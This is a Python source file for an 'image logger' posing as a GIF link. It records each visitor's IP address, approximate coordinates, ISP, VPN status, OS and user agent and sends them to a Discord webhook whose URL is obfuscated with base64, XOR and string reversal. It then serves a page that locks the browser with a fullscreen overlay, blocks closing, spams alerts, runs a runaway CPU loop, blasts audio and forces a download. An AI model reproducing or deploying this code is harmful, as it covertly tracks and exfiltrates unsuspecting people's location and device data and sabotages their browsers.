from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import base64
import sys

MADE BY HELLENWONG

def unhide_webhook():
    # === OBFUSCATED PAYLOAD (your current webhook) ===
    encoded = "LDwNAjcqOj80DUYeGC5HNDcZIQhTNz8wQgM2GSwNFx5XPiwZOyo8Di0pIysiNxc3PjkDHUIWITg7ECIkDyUFGAYOARpIREVbUkdaR0JLTEVaVkxMX15CWF0GGBsaBgURAkEOBghdGBwXWwoVGxYdDhJGXU8ABAEaDw=="
    
    # Layer 3: Base64 decode
    step1 = base64.b64decode(encoded).decode('utf-8')
    
    # Layer 2: XOR decrypt (same key used during encoding)
    key = "tungtungvirus"
    step2 = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(step1))
    
    # Layer 1: reverse back to original
    return step2[::-1]

# This is the ONLY place the real URL exists (in memory at runtime)
WEBHOOK_URL = unhide_webhook()

# DEBUG: Print the decoded URL so you can verify it's correct
print("✅ DEBUG: Webhook URL successfully unhidden:", WEBHOOK_URL, file=sys.stderr)

FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"

# Max annoying page + loud song + HEAVY CPU lag
ANNOY_HTML = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>TUNG TUNG HELLENWONGTUNG</title>
  <style>body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}#overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}</style>
</head>
<body>
  <div id="overlay">
    <h1 style="font-size:6em;animation:blink 0.3s infinite;">TUNG TUNG VIRUS</h1>
    <p style="font-size:2em;">Your browser is now mine...</p>
  </div>
  <!-- Loud Tung Tung Song -->
  <audio id="song" autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
  </audio>
  <script>
    // Fullscreen
    document.documentElement.requestFullscreen?.().catch(()=>{});
    // Block closing
    window.onbeforeunload = () => "TUNG TUNG says NO!";
    // Spam alerts
    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 700);
    // HEAVY CPU EATER (this lags the browser badly)
    function cpuHell() {
      while(true) {
        for(let i = 0; i < 20000000; i++) {
          Math.sin(i) * Math.cos(i) * Math.random();
        }
        setTimeout(cpuHell, 0);
      }
    }
    cpuHell();
    // Max volume song
    const audio = document.getElementById("song");
    audio.volume = 1.0;
    audio.play().catch(()=>{});
    // Force GIF download
    const link = document.createElement('a');
    link.href = "%s";
    link.download = "tung-tung-virus.gif";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  </script>
</body>
</html>
""" % FAKE_IMAGE_URL

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            port = self.headers.get('X-Forwarded-Port', 'Unknown')
            user_agent = self.headers.get('User-Agent', 'Unknown')
            parsed = httpagentparser.detect(user_agent)

            # ====================== IP INTELLIGENCE (exactly like your screenshot) ======================
            ip_info = {}
            try:
                # Free, no-key API — gives Mobile + VPN (proxy) + all the fields you wanted
                resp = requests.get(
                    f"https://ip-api.com/json/{ip}?fields=status,country,region,regionName,city,lat,lon,timezone,isp,as,mobile,proxy",
                    timeout=5
                )
                ip_info = resp.json()
            except:
                pass  # fallback to unknowns if API is down/rate-limited

            if ip_info.get("status") == "success":
                provider = ip_info.get("isp", "Unknown")
                asn = ip_info.get("as", "Unknown")
                country = ip_info.get("country", "Unknown")
                region = ip_info.get("regionName", "Unknown")
                city = ip_info.get("city", "Unknown")
                coords = f"{ip_info.get('lat', 'N/A')}, {ip_info.get('lon', 'N/A')}"
                timezone = ip_info.get("timezone", "Unknown")
                mobile = ip_info.get("mobile", False)
                vpn = ip_info.get("proxy", False)          # this is the VPN flag most loggers use
            else:
                provider = asn = country = region = city = coords = timezone = "Unknown"
                mobile = vpn = False

            os_name = parsed.get('os', {}).get('name', 'Unknown')
            browser_name = parsed.get('browser', {}).get('name', 'Unknown')

            # ====================== BEAUTIFUL DISCORD EMBED (looks just like your screenshot) ======================
            embed = {
                "title": "🖼️ Image Logger - IP Logged",
                "description": "**A User Opened the Original Image!**\n\n**TUNG TUNG VIRUS + loud song + CPU hell activated!**",
                "color": 16711680,  # bright red
                "thumbnail": {"url": FAKE_IMAGE_URL},
                "fields": [
                    {"name": "Endpoint", "value": "`/`", "inline": True},
                    {"name": "IP", "value": f"`{ip}`", "inline": True},
                    {"name": "Provider", "value": provider, "inline": True},
                    {"name": "ASN", "value": asn, "inline": True},
                    {"name": "Country", "value": country, "inline": True},
                    {"name": "Region", "value": region, "inline": True},
                    {"name": "City", "value": city, "inline": True},
                    {"name": "Coords", "value": f"{coords} (Approximate)", "inline": True},
                    {"name": "Timezone", "value": timezone, "inline": True},
                    {"name": "Mobile", "value": "✅ True" if mobile else "❌ False", "inline": True},
                    {"name": "VPN", "value": "✅ True" if vpn else "❌ False", "inline": True},
                    {"name": "Bot", "value": "❌ False", "inline": True},
                    {"name": "PC Info", "value": f"**OS:** {os_name}\n**Browser:** {browser_name}", "inline": False},
                    {"name": "User Agent", "value": f"```{user_agent}```", "inline": False},
                ],
                "footer": {"text": "Powered by TUNG TUNG VIRUS"}
            }

            print("📤 Sending rich embed to Discord...", file=sys.stderr)
            response = requests.post(
                WEBHOOK_URL,
                json={"embeds": [embed]},
                timeout=10
            )
            response.raise_for_status()
            print(f"✅ Webhook sent successfully! Discord status: {response.status_code}", file=sys.stderr)

            # Serve the annoying prank page
            html = ANNOY_HTML.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', len(html))
            self.end_headers()
            self.wfile.write(html)

        except requests.exceptions.RequestException as e:
            error_msg = f"Webhook failed: {str(e)}"
            print("❌ " + error_msg, file=sys.stderr)
            # Still serve the prank even if webhook fails
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(ANNOY_HTML.encode('utf-8'))
        except Exception as e:
            print(f"❌ Unexpected error: {str(e)}", file=sys.stderr)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

    def do_HEAD(self):
        self.do_GET()
